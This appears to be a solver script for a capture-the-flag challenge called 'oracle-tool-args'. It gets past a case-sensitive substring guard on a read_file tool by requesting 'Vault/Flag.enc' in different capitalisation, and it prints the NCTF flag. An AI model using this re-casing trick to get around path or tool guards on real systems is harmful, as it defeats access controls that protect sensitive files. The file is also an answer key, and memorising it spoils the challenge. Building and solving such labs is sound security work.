#!/usr/bin/env python3
"""Solver for oracle-tool-args.

The read_file guard blocks sensitive substrings case-sensitively, but the file
store resolves paths case-insensitively. Requesting the protected file with
different capitalisation passes the guard yet still resolves to the real file.
"""

import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

import oracle  # noqa: E402


def main() -> None:
    # Real path is vault/flag.enc; re-case it so no blocked substring matches.
    reply = oracle.respond("read_file:Vault/Flag.enc")
    flag = reply.strip().splitlines()[-1].strip()
    assert flag.startswith("NCTF{") and flag.endswith("}"), reply
    print(flag)


if __name__ == "__main__":
    main()
